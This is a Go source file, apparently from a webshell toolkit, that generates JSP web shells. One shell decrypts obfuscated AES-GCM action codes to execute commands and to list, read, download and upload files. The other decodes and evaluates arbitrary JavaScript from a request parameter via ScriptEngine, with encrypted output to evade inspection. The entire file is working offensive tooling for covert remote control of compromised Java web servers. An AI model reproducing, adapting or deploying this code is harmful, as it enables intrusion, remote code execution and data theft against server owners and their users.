package jsp

import (
	"strings"

	"github.com/Yliken/redbeanshellcore/crypto/fragment"
)

func cryptoImport() string {
	return `<%@page import="javax.crypto.*,javax.crypto.spec.*,java.security.*,java.util.*,java.io.*,java.text.*"%>`
}

// pwWrap replaces out.print( with __pw.print( and out.println with __pw.println
func pwWrap(code string) string {
	code = strings.ReplaceAll(code, "out.println()", "__pw.println()")
	return strings.ReplaceAll(code, "out.print(", "__pw.print(")
}

// aesgcmFragment builds an AES-GCM fragment. Invalid key lengths fall back to
// the raw key so legacy callers that passed arbitrary bytes keep working.
func aesgcmFragment(key []byte) fragment.Fragment {
	frag, err := fragment.NewAESGCM(key)
	if err != nil {
		return &fragment.AESGCM{Key: key}
	}
	return frag
}

// CryptoShellSource returns the action-level AES-GCM encrypted static shell.
func CryptoShellSource(key []byte) string {
	return CryptoShellSourceWith(key, DefaultObfuscator())
}

// CryptoShellSourceWith returns the action-level AES-GCM encrypted static shell
// with a custom Obfuscator.
func CryptoShellSourceWith(key []byte, obf *Obfuscator) string {
	return CryptoShellSourceWithFragment(aesgcmFragment(key), obf)
}

// CryptoShellSourceWithFragment injects a CryptoFragment into the
// action-level encrypted static shell. The fragment owns the dec/enc methods.
func CryptoShellSourceWithFragment(frag fragment.Fragment, obf *Obfuscator) string {
	af := obf.ActionField()
	acInfo := obf.ActionCode("info")
	acExec := obf.ActionCode("exec")
	acList := obf.ActionCode("file.list")
	acRead := obf.ActionCode("file.read")
	acDown := obf.ActionCode("file.download")
	acUp := obf.ActionCode("file.upload")

	tpl := &JSPTemplates{}
	infoCode := pwWrap(tpl.Info())
	execCode := pwWrap(tpl.Exec())
	listCode := pwWrap(tpl.FileList())
	readCode := pwWrap(tpl.FileRead())
	downCode := pwWrap(tpl.FileDownload())
	upCode := pwWrap(tpl.FileUpload())

	return cryptoImport() + "\n" +
		`<%!` + frag.DecryptJava() + frag.EncryptJava() + HelperBase64With(obf) + `%>` + "\n" +
		`<%
java.io.StringWriter __sw=new java.io.StringWriter();
java.io.PrintWriter __pw=new java.io.PrintWriter(__sw);
try{
String z0=dec(request.getParameter("` + af + `"));
if("` + acInfo + `".equals(z0)){` + infoCode + `
}else if("` + acExec + `".equals(z0)){` + execCode + `
}else if("` + acList + `".equals(z0)){` + listCode + `
}else if("` + acRead + `".equals(z0)){` + readCode + `
}else if("` + acDown + `".equals(z0)){` + downCode + `
}else if("` + acUp + `".equals(z0)){` + upCode + `
}else{__pw.print("ERR:UNKNOWN_ACTION");}
}catch(Exception ex){__pw.print("ERR:"+ex.getMessage());}
__pw.flush();out.print(enc(__sw.toString()));
%>`
}

// CryptoDynamicShellSource returns the ScriptEngine-based AES-GCM encrypted shell.
func CryptoDynamicShellSource(key []byte) string {
	return CryptoDynamicShellSourceWith(key, DefaultObfuscator())
}

// CryptoDynamicShellSourceWith returns the ScriptEngine-based AES-GCM encrypted
// shell with a custom Obfuscator.
func CryptoDynamicShellSourceWith(key []byte, obf *Obfuscator) string {
	return CryptoDynamicShellSourceWithFragment(aesgcmFragment(key), obf)
}

// CryptoDynamicShellSourceWithFragment injects a CryptoFragment into the
// ScriptEngine-based encrypted shell.
func CryptoDynamicShellSourceWithFragment(frag fragment.Fragment, obf *Obfuscator) string {
	af := obf.ActionField()
	p1 := obf.Param1()
	p2 := obf.Param2()

	return cryptoImport() + "\n" +
		`<%!` + frag.DecryptJava() + frag.EncryptJava() + `%>` + "\n" +
		`<%
try{
String z0=dec(request.getParameter("` + af + `"));
if(z0!=null&&!z0.isEmpty()){
  javax.script.ScriptEngineManager m=new javax.script.ScriptEngineManager();
  javax.script.ScriptEngine eng=m.getEngineByName("js");
  if(eng==null){
    out.print(enc("ERR:SCRIPT:ScriptEngine(Nashorn) not available"));
  }else{
    java.io.StringWriter __sw=new java.io.StringWriter();java.io.PrintWriter __pw=new java.io.PrintWriter(__sw);eng.put("out",__pw);
    eng.put("request",request);
    eng.put("response",response);
    eng.put("P1","` + p1 + `");
    eng.put("P2","` + p2 + `");
    eng.eval("var b64d=function(s){return new java.lang.String(java.util.Base64.getDecoder().decode(s),\"UTF-8\")};var b64e=function(s){return java.util.Base64.getEncoder().encodeToString(s.getBytes(\"UTF-8\"))};");
    String __js=new String(java.util.Base64.getDecoder().decode(z0),"UTF-8");
    eng.eval(__js);
    __pw.flush();
    out.print(enc(__sw.toString()));
  }
}
}catch(Exception ex){
  out.print(enc("ERR:"+ex.getMessage()));
}
%>`
}
